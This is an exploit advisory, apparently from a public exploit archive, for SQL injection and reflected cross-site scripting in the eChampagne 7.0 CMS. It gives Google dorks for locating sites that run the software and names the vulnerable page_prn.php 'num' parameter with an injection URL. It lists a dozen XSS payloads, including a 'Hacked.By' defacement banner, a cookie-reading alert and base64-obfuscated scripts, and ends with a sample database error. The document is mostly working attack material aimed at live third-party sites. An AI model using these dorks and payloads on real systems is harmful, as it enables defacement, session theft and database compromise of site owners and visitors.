
# Exploit Title : EnovaNet Chateau-Thierry FormaLog WebService02 eChampagne 7.0 XSS SQL Injection
# Author [ Discovered By ] : KingSkrupellos
# Vendor Homepages : echampagne.pro 
enovanet.fr - formalog.info - webservice02.com
# Software Affected Version : 6.0 and 7.0
# Software Link : enovanet.fr/cms-creation-site-internet-web-design-chateau-thierry-pages-Plan-d-acces-fr-0-7-8.html
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : High
# Google Dorks : intext:Création enovanet - Moteur eChampagne 7.0
intext:Maître d&#039;œuvre Formalog.info / eNovanet (Château-Thierry) - Moteur eChampagne 6.0
intext:Maître d&#039;œuvre enovanet - Moteur eChampagne
intext:Maître d&#039;œuvre Formalog .info / eNovanet (Château-Thierry) - Moteur enovanet 7.0 
# Vulnerability Type : CWE-89 [ Improper Neutralization of 
Special Elements used in an SQL Command (&#039;SQL Injection&#039;) ]
CWE-79 [ Improper Neutralization of Input During 
Web Page Generation (&#039;Cross-site Scripting&#039;) ]
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos

###################################################################

# Impact :
***********
EnovaNet Chateau-Thierry FormaLog WebService02 eChampagne 7.0 is prone to an SQL-injection 
vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query. 
Exploiting this issue could allow an attacker to compromise the application, access or modify 
data, or exploit latent vulnerabilities in the underlying database. A remote attacker can send 
a specially crafted request to the vulnerable application and execute arbitrary SQL commands 
in application`s database. Further exploitation of this vulnerability may result in unauthorized 
data manipulation. An attacker can exploit this issue using a browser or with any SQL Injector Tool.

Reflected XSS (or Non-Persistent) :
***************************************
The server reads data directly from the HTTP request and reflects it back in the HTTP response. 
Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content
to a vulnerable web application, which is then reflected back to the victim and executed by the 
web browser. The most common mechanism for delivering malicious content is to include 
it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. 
URLs constructed in this manner constitute the core of many phishing schemes, whereby 
an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects 
the attacker&#039;s content back to the victim,the content is executed by the victim&#039;s browser.

###################################################################

# SQL Vulnerable File :
*********************
/page_prn.php

# SQL Vulnerable Parameter :
**************************
?lang=fr&num=

# SQL Injection Exploit :
**********************
/pages/page_prn.php?lang=fr&num=[SQL Injection]

# Cross Site Scripting XSS Exploit :
********************************
/pages/page_prn.php?lang=fr&num=1%27%3Cmarquee%3E%3Cfont%20color=lime%20size=32%3EHacked.By.KingSkrupellos.%3C/font%3E%3C/marquee%3E

1%27<marquee><font%20color=lime%20size=32>Hacked.By.KingSkrupellos.</font></marquee>

"><script>alert(String.fromCharCode(88,83,83))</script>

">--></SCRIPT>KingSkrupellos<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>%20HTTP/1.1

<ScRipT>alert("XSS");</ScRipT>

"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>

“><ScRiPt>alert(document.cookie)</script>

data:text/html,<script>alert(0)</script>

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

&#039;;alert(String.fromCharCode(88,83,83))//&#039;;alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">&#039;><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>

<svg onload=alert(1)//

<object data=&#039;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#039;></object>

"`&#039;><script>\xE2\x80\x84javascript:alert(1)</script>

###################################################################

# Example SQL Database Error :
****************************
Erreur pendant la requete SELECT * FROM fr_pages WHERE numpage=1\&#039;
You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near &#039;\&#039;&#039; at line 1

###################################################################

